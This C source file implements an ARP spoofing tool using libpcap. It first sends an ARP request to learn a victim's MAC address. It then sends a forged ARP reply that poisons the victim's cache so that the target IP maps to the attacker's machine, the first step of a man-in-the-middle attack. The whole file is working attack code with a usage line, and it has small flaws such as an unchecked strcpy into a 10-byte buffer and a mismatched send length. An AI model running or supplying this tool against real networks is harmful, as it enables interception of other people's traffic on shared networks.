#include "arp_spoof.h"


void makeRequestPacket(unsigned char *packet, char *interface, unsigned char *sender_ip);
void makeInfectPacket(unsigned char* packet, char* interface, unsigned char *sender_ip, unsigned char *sender_mac, unsigned char *target_ip);
void updatePacketinfo(struct packetinfo* pinfo, const unsigned char *packet);
void printPacket(unsigned char* packet,int len);
void getMymac(unsigned char MAC_str[ETH_ALEN], char* interface);
void getMyip(unsigned char IP_ADDR[4], char* dev);
void writeArpHeaderFrame(unsigned char* packet,int opcode);
int checkRightPacket(unsigned char* packet, unsigned char* smac, unsigned char* dmac);

//int checkRightPacket



int main(int argc, char *argv[])
{
    pcap_t *handle;
    unsigned char packet[42]={0,},senderMAC[ETH_ALEN]={0,},senderIP[4],targetIP[4],mymac[ETH_ALEN],myip[4];
    char dev[10],errbuf[PCAP_ERRBUF_SIZE];

    // Check argc,argv and input variables
    if (argc !=4){
        puts("usage : arp_spoof [interface] [sender ip] [target ip]");
        return 0;
    }
    strcpy(dev,argv[1]);
    inet_pton(AF_INET,argv[2],senderIP);
    inet_pton(AF_INET,argv[3],targetIP);
    getMymac(mymac,dev);
    getMyip(myip,dev);

    // Make request packet
    makeRequestPacket(packet,dev,senderIP);
    printPacket(packet,42);

    // Get sender MAC
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    struct pcap_pkthdr *header;
    const unsigned char *recieve_packet;
    int retValue;
    while(1)
    {
        if(pcap_sendpacket(handle,(const unsigned char*)packet,sizeof(packet)) != 0){
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
            continue;
        }
        retValue = pcap_next_ex(handle, &header, &recieve_packet);
        if( retValue < 0){
            puts("Error grabbing packet\n");
            continue;
        }
        if( retValue == 0 ){
            puts("Timeout");
            continue;
        }
        else
        {
            struct packetinfo pinfo;
            updatePacketinfo(&pinfo,recieve_packet);
            if( !memcmp(pinfo.ar_sip,senderIP,4) && !memcmp(pinfo.ar_tip,myip,4) && \
                    pinfo.ar_op == ARPOP_REPLY && !memcmp(pinfo.ar_tha,mymac,ETH_ALEN))
            {
                memcpy(senderMAC,pinfo.ar_sha,ETH_ALEN);
                break;
            }
        }
    }

    unsigned char infectPacket[60];
    makeInfectPacket(infectPacket,dev,senderIP,senderMAC,targetIP);
    if(pcap_sendpacket(handle,(const unsigned char*)infectPacket,sizeof(packet)) != 0){
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
    }
    return 0;
}



/* -----ETHER-------
 * Destination MAC  : [Broadcast]
 * Source MAC   : mymac
 * ------ARP-------
 * Sender MAC   : mymac
 * Sender IP    : myip
 * Target MAC   : [Empty]
 * Target IP    : [sender ip]
 */
void makeRequestPacket(unsigned char* packet,char* interface,unsigned char* sender_ip)
{
    int offset=0;
    unsigned char mymac[ETH_ALEN],myip[4];
    getMymac(mymac,interface);
    getMyip(myip,interface);

    // Writing part

    // ETHERNET header
    struct ether_header *ethhdr=(struct ether_header*)packet;
    memcpy(ethhdr->ether_dhost,"\xFF\xFF\xFF\xFF\xFF\xFF",ETH_ALEN);
    memcpy(ethhdr->ether_shost,mymac,ETH_ALEN);
    ethhdr->ether_type=htons(ETH_P_ARP);
    offset+=ETH_HLEN;
    // ARP header
    writeArpHeaderFrame(packet+offset,ARPOP_REQUEST);
    offset+=sizeof(struct arphdr);
    struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+offset);
    memcpy(arpb->ar_sha,mymac,ETH_ALEN);
    memcpy(arpb->ar_sip,myip,4);
    memcpy(arpb->ar_tha,"\x00\x00\x00\x00\x00\x00",ETH_ALEN);
    memcpy(arpb->ar_tip,sender_ip,4);

}

/* -----ETHER-------
 * Destination MAC  : [sender mac]
 * Source MAC   : mymac
 * ------ARP-------
 * Sender MAC   : mymac
 * Sender IP    : [target ip]
 * Target MAC   : [sender mac]
 * Target IP    : [sender ip]
 */
void makeInfectPacket(unsigned char* packet, char* interface, unsigned char* sender_ip, unsigned char* sender_mac, unsigned char* target_ip)
{
    int offset=0;
    unsigned char mymac[ETH_ALEN];
    getMymac(mymac,interface);

    // Writing part

    // ETHERNET header
    struct ether_header *ethhdr=(struct ether_header*)packet;
    memcpy(ethhdr->ether_dhost,sender_mac,ETH_ALEN);
    memcpy(ethhdr->ether_shost,mymac,ETH_ALEN);
    ethhdr->ether_type=htons(ETH_P_ARP);
    offset+=ETH_HLEN;
    // ARP header
    writeArpHeaderFrame(packet+offset,ARPOP_REPLY);
    offset+=sizeof(struct arphdr);
    struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+offset);
    memcpy(arpb->ar_sha,mymac,ETH_ALEN);
    memcpy(arpb->ar_sip,target_ip,4);
    memcpy(arpb->ar_tha,sender_mac,ETH_ALEN);
    memcpy(arpb->ar_tip,sender_ip,4);

}

void updatePacketinfo(struct packetinfo* pinfo, const unsigned char* packet){
    memcpy(pinfo,packet,ETH_HLEN);
    struct arphdr* arph = (struct arphdr*)(packet+ETH_HLEN);
    pinfo->ar_op=htons(arph->ar_op);
    struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+ETH_HLEN+sizeof(struct arphdr));
    memcpy(pinfo->ar_sha,arpb->ar_sha,ETH_ALEN);
    memcpy(pinfo->ar_sip,arpb->ar_sip,4);
    memcpy(pinfo->ar_tha,arpb->ar_tha,ETH_ALEN);
    memcpy(pinfo->ar_tip,arpb->ar_tip,4);
}



/* ARP header frame
 * Hardware type : Ethernet(1)  Protocol type : IPv4(0x0800)
 * Hardware size : size of mac(6) Protocol size : size of ip (6)
 * Opcode : (input value)
 */
void writeArpHeaderFrame(unsigned char* packet,int opcode)
{
    struct arphdr* arph = (struct arphdr*)packet;
    arph->ar_hrd=htons(ARPHRD_ETHER);
    arph->ar_pro=htons(ETHERTYPE_IP);
    arph->ar_hln=0x06;
    arph->ar_pln=0x04;
    arph->ar_op=htons(opcode);
}

void getMymac(unsigned char MAC_ADDR[ETH_ALEN], char* interface)
{
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<ETH_ALEN; i++)
        MAC_ADDR[i]=(unsigned char)ifr.ifr_hwaddr.sa_data[i];
}

void getMyip(unsigned char IP_ADDR[4], char* dev)
{
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    memcpy(IP_ADDR,&(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr),4);
}

void printPacket(unsigned char* packet,int len)
{
    int i;
    for ( i=0; i < len ; i++ ){
        if (i%16 ==0 && i != 0){
            printf("  ");
            for ( int j=-16;j<=-1;j++ ){
                if (j == -8)
                    printf("  ");
                if (isprint(*(packet+i+j)))
                    printf("%c", *(packet+i+j));
                else
                    printf(".");
            }
            printf("\n");
        }
        if ( i % 8 ==0 )
            printf ("  ");
        printf("%02x ", *(packet+i));
    }
    for(i=0;i<16-(len%16);i++){
        printf("   ");
        if ( i % 8 ==0 )
            printf ("  ");
    }
    for ( int i=(len/16)*16;i<len;i++ ){
        if (i%8 == 0 && i%16 != 0)
            printf("  ");
        if (isprint(*(packet+i)))
            printf("%c", *(packet+i));
        else
            printf(".");
    }
    printf("\n");
}
